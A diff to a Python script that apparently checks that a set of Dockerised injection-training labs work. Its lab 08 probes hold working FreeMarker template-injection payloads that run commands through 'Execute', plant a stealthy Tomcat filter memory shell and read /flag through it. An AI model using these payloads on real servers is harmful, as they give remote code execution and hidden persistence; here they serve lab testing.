@@ -66,12 +66,34 @@ class RenderCheck:
 
 
 @dataclass
+class RawCheck:
+    """对**非** `/api/render` 契约的端点做一次原始 HTTP 断言。
+
+    场景型靶场（lab 07/08）的利用链是「打业务接口」而不是「提交模板给控制台」，
+    所以需要一个更通用的探针：请求任意路径，断言响应体内容 / 状态码 / 不应出现的内容。
+    """
+
+    path: str
+    params: dict[str, str] = field(default_factory=dict)
+    method: str = "GET"
+    #: 期望响应体包含
+    expect: str = ""
+    #: 期望响应体**不**包含（用于「无回显」「对照案例」这类反向断言）
+    expect_absent: str = ""
+    #: 期望的 HTTP 状态码；0 表示只要求 2xx/3xx
+    expect_status: int = 0
+    note: str = ""
+
+
+@dataclass
 class Lab:
     key: str            # 目录前缀，如 "02"
     name: str           # 目录名
     image: str
     container_port: int = 5000
     probes: list[RenderCheck] = field(default_factory=list)
+    #: 非 /api/render 的原始 HTTP 断言（场景型靶场用）
+    raw_probes: list[RawCheck] = field(default_factory=list)
     #: 需要 NET_ADMIN（不出网靶场）
     net_admin: bool = False
     #: 该靶场是否提供 /api/render（场景型靶场也提供，见 docs/API.md §5）
@@ -79,6 +101,14 @@ class Lab:
     #: 统一控制台的挂载路径。场景型靶场把业务页面放在 "/"，
     #: 控制台挪到 "/console/"（见 docs/API.md §5）。
     console_path: str = "/"
+    #: 启动等待上限（秒）。JVM 系靶场需要更久。
+    startup_timeout: float = 60.0
+    #: 业务首页路径（默认 "/"）。设为 None 表示跳过该检查。
+    home_path: str | None = "/"
+    #: 是否要求该靶场的页面引用**统一前端构建产物**（assets/）。
+    #: Java 靶场自带静态页，不引用统一前端，所以那里置 False ——
+    #: 这样 lab 07 的「控制台必须是统一前端」这条断言不会被削弱。
+    console_expect_assets: bool = True
 
 
 FLAG_TMPL = "flag{verify_%s}"
@@ -300,6 +330,43 @@ LABS: list[Lab] = [
         container_port=8080,
         net_admin=True,
         has_render=False,
+        startup_timeout=180.0,
+        console_expect_assets=False,
+        raw_probes=[
+            RawCheck(
+                "/theme/preview", {"template": "${7*7}"}, expect="49",
+                note="FreeMarker 求值：确认 ${{...}} 是注入点",
+            ),
+            RawCheck(
+                "/theme/preview",
+                {"template": '${"freemarker.template.utility.Execute"?new()("id")}'},
+                expect="uid=",
+                note="UNRESTRICTED 类解析器 ⇒ 任意 Java 代码执行",
+            ),
+            RawCheck(
+                "/theme/preview",
+                {"template": '${"com.lab.themepreview.memshell.InjectHelper"?new(servletContext)()}'},
+                expect="filterStart=true",
+                note="把 Tomcat Filter 动态注册进运行中的 StandardContext",
+            ),
+            RawCheck(
+                "/memshell", {"cmd": "cat /flag"}, expect=FLAG_TMPL % "08",
+                note="经内存马读 /flag（全程不出网）",
+            ),
+            RawCheck(
+                "/memshell", {"b64cmd": "Y2F0IC9mbGFn"}, expect=FLAG_TMPL % "08",
+                note="base64 变体（便于投递含引号/管道的命令）",
+            ),
+            RawCheck(
+                "/memshell", expect_status=404,
+                note="不携带 cmd 时 Filter 原样放行（隐蔽性要求）",
+            ),
+            RawCheck(
+                "/theme/thymeleaf", {"theme": "__${7*7}__"},
+                expect_status=500, expect_absent="49",
+                note="对照案例：Thymeleaf 模板名在本栈上不求值（500=视图名找不到，且响应里没有 49）",
+            ),
+        ],
     ),
 ]
 
@@ -319,7 +386,10 @@ def image_exists(image: str) -> bool:
 
 def http(url: str, *, method: str = "GET", body: dict | None = None, timeout: float = 8.0):
     data = None
-    headers = {"Accept": "application/json"}
+    # ⚠️ 不要写死 `Accept: application/json`：Spring 的内容协商会据 Accept 选表示，
+    #    而 `/healthz` 只产出 text/plain —— 于是 406 Not Acceptable。
+    #    用 `*/*` 让服务端自己决定，响应体照样能按 JSON 解析（api/* 都显式声明了 JSON）。
+    headers = {"Accept": "*/*"}
     if body is not None:
         data = json.dumps(body).encode()
         headers["Content-Type"] = "application/json"
@@ -389,7 +459,7 @@ def verify_lab(lab: Lab, port: int, rep: Reporter, *, keep: bool) -> None:
         return
 
     try:
-        healthy, detail = wait_healthy(port, container)
+        healthy, detail = wait_healthy(port, container, timeout=lab.startup_timeout)
         if not healthy:
             rep.bad(f"{lab.name} /healthz", detail)
             return
@@ -413,7 +483,9 @@ def verify_lab(lab: Lab, port: int, rep: Reporter, *, keep: bool) -> None:
         try:
             status, html = http(f"http://127.0.0.1:{port}{lab.console_path}")
             where = "GET /" if lab.console_path == "/" else f"GET {lab.console_path}（控制台）"
-            if status == 200 and "assets/" in html:
+            if not lab.console_expect_assets:
+                rep.ok(f"{where} → 200（该靶场自带页面）") if status == 200 else rep.bad(where, f"status={status}")
+            elif status == 200 and "assets/" in html:
                 rep.ok(f"{where} → 200 且引用前端构建产物")
             elif status == 200:
                 rep.bad(where, "200 但未见 assets/（可能回退到了内置降级控制台？）")
@@ -423,15 +495,15 @@ def verify_lab(lab: Lab, port: int, rep: Reporter, *, keep: bool) -> None:
             rep.bad(f"GET {lab.console_path}", f"{type(exc).__name__}: {exc}")
 
         # 场景型靶场额外确认业务首页可用
-        if lab.console_path != "/":
+        if lab.console_path != "/" and lab.home_path:
             try:
-                status, html = http(f"http://127.0.0.1:{port}/")
+                status, html = http(f"http://127.0.0.1:{port}{lab.home_path}")
                 if status == 200 and html.strip():
-                    rep.ok("GET / → 200（业务首页）")
+                    rep.ok(f"GET {lab.home_path} → 200（业务首页）")
                 else:
-                    rep.bad("GET /（业务首页）", f"status={status}")
+                    rep.bad(f"GET {lab.home_path}（业务首页）", f"status={status}")
             except Exception as exc:  # noqa: BLE001
-                rep.bad("GET /（业务首页）", f"{type(exc).__name__}: {exc}")
+                rep.bad(f"GET {lab.home_path}（业务首页）", f"{type(exc).__name__}: {exc}")
 
         # ---- flag 不可从镜像层读出（抽查容器内确实存在） --------------------
         flag = FLAG_TMPL % lab.key
@@ -441,9 +513,10 @@ def verify_lab(lab: Lab, port: int, rep: Reporter, *, keep: bool) -> None:
         else:
             rep.bad("/flag 内容", f"rc={cat.returncode} out={cat.stdout!r} err={cat.stderr!r}")
 
-        # ---- render 断言 ---------------------------------------------------
+        # ---- render 断言（控制台型靶场） ------------------------------------
         if not lab.has_render:
             rep.skip("render 检查", "该靶场不实现 /api/render 契约")
+            _run_raw_probes(lab, port, rep)
             return
         for check in lab.probes:
             body = {"level": check.level, "template": check.template, "mode": check.mode}
@@ -490,11 +563,53 @@ def verify_lab(lab: Lab, port: int, rep: Reporter, *, keep: bool) -> None:
                     f"不含 {check.expect_absent!r}" if check.expect_absent else f"{out[:40]!r}"
                 )
                 rep.ok(f"{label} → {shown}")
+
+        # ---- 原始 HTTP 断言（场景型靶场的业务链路） --------------------------
+        _run_raw_probes(lab, port, rep)
     finally:
         if keep:
             print(f"    (--keep) 容器保留：{container}")
         else:
             run(["docker", "rm", "-f", container])
+
+
+def _run_raw_probes(lab: Lab, port: int, rep: Reporter) -> None:
+    """跑 `Lab.raw_probes`：任意路径 + 任意方法，断言内容 / 状态码。"""
+    for rc in lab.raw_probes:
+        url = f"http://127.0.0.1:{port}{rc.path}"
+        if rc.params:
+            url += "?" + urlencode(rc.params)
+        label = f"{rc.method} {rc.path} {(rc.note or '')[:46]}"
+        try:
+            status, raw = http(url, method=rc.method)
+        except urllib.error.HTTPError as exc:
+            # 期望非 2xx（例如「不带 cmd 时应当 404」）会走到这里
+            body = exc.read().decode("utf-8", "replace") if hasattr(exc, "read") else ""
+            if rc.expect_status and exc.code == rc.expect_status:
+                rep.ok(f"{label} → 如期 {exc.code}")
+            else:
+                rep.bad(label, f"HTTP {exc.code}（期望 {rc.expect_status or '2xx'}）")
+            continue
+        except Exception as exc:  # noqa: BLE001
+            rep.bad(label, f"{type(exc).__name__}: {exc}")
+            continue
+
+        problems: list[str] = []
+        if rc.expect_status and status != rc.expect_status:
+            problems.append(f"期望状态码 {rc.expect_status}，实际 {status}")
+        if not rc.expect_status and not (200 <= status < 400):
+            problems.append(f"期望 2xx/3xx，实际 {status}")
+        if rc.expect and rc.expect not in raw:
+            problems.append(f"期望含 {rc.expect!r}")
+        if rc.expect_absent and rc.expect_absent in raw:
+            problems.append(f"期望不含 {rc.expect_absent!r}")
+        if problems:
+            rep.bad(label, "；".join(problems) + f"（body={raw[:200]!r}）")
+        else:
+            shown = (repr(rc.expect) if rc.expect
+                     else f"不含 {rc.expect_absent!r}" if rc.expect_absent
+                     else f"status={status}")
+            rep.ok(f"{label} → {shown}")
 
 
 def main(argv: list[str] | None = None) -> int:
